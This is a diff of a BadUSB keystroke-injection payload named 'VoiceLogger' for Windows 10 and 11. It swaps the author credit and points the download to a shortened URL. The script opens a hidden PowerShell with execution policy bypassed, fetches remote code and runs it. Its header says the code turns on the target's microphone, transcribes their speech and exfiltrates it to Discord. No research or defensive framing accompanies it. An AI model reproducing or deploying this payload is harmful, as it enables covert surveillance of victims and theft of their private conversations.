@@ -1,6 +1,6 @@
 REM     Title: VoiceLogger
 
-REM     Author: I am Jakoby
+REM     Author:mrflippermen
 
 REM     This payload activates your targets microphone and converts their speech to text and exfils it to discord
 
@@ -8,5 +8,5 @@ REM     Target: Windows 10, 11
 
 GUI r
 DELAY 500
-STRING powershell -w h -NoP -Ep Bypass $dc='';$db=''; irm jakoby.lol/voiceLogger | iex
+STRING powershell -w h -NoP -Ep Bypass $dc='';$db=''; irm https://n9.cl/mrflipper3 | iex
 ENTER
